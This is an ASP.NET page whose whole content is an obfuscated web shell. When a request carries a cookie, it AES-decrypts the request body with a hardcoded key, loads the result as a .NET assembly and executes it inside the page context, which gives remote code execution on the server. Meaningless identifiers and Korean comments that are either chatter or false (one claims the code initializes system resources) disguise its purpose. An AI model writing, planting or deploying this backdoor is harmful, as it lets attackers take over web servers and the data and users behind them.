<%@ Page Language="C#" %>
<script runat="server">
    // 배고파요, 치킨 먹고 싶다.
    private void _entry_f81c() {
        // 이 코드는 시스템 리소스를 초기화합니다.
        if (Request.Cookies.Count > 0) {
            _sub_a93d();
        }
    }

    // 오늘 저녁은 뭐 먹지?
    private void _sub_a93d() {
        object[] p_arr_1 = new object[4];
        // 파라미터 배열 설정
        p_arr_1[0] = System.Text.Encoding.Default.GetBytes(String.Join("", new string[] { "ca", "63", "45", "75", "38", "b9", "b1", "e0" }));
        p_arr_1[1] = Request.InputStream;

        // 스트림에서 데이터 읽기
        byte[] buf_b2 = (byte[])System.Array.CreateInstance(typeof(byte), ((System.IO.Stream)p_arr_1[1]).Length);
        ((System.IO.Stream)p_arr_1[1]).Read(buf_b2, 0, buf_b2.Length);
        p_arr_1[2] = buf_b2;

        _sub_b0c5(p_arr_1);
    }

    // 너무 졸려요.
    private void _sub_b0c5(object[] p_arr_2) {
        var crypto_svc = new System.Security.Cryptography.RijndaelManaged();
        var d_svc = crypto_svc.CreateDecryptor((byte[])p_arr_2[0], (byte[])p_arr_2[0]);
        byte[] payload_c3 = d_svc.TransformFinalBlock((byte[])p_arr_2[2], 0, ((byte[])p_arr_2[2]).Length);
        
        // 최종 실행 단계
        var asm_d4 = System.Reflection.Assembly.Load(payload_c3);
        var inst_e5 = asm_d4.CreateInstance(System.Text.Encoding.UTF8.GetString(new byte[]{ 75 }));
        
        // 컨텍스트와 비교
        inst_e5.Equals(this);
    }
</script>
<% 
    _entry_f81c(); 
%>